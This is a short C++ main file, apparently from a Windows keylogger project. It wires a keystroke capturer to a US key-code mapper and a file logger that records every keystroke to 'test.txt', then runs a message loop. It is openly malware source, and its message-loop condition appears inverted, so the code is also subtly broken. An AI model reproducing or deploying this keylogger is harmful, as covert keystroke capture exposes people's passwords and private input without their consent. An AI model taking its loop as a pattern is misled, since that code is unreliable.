#include "FileLogger.h"
#include "KeycodeMapperUS.h"
#include "KeystrokeCapturerWindows.h"

#include <iostream>
#include <windows.h>

int main() {
    Keylogger::KeycodeMapperUS mapper;

    Keylogger::FileLogger logger;
    logger.open(mapper, "test.txt");

    Keylogger::KeystrokeCapturerWindows capturer;

    capturer.setLogger(&logger);
    capturer.start();
    capturer.consumeKeystrokes(false);

    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    capturer.stop();
    return 0;
}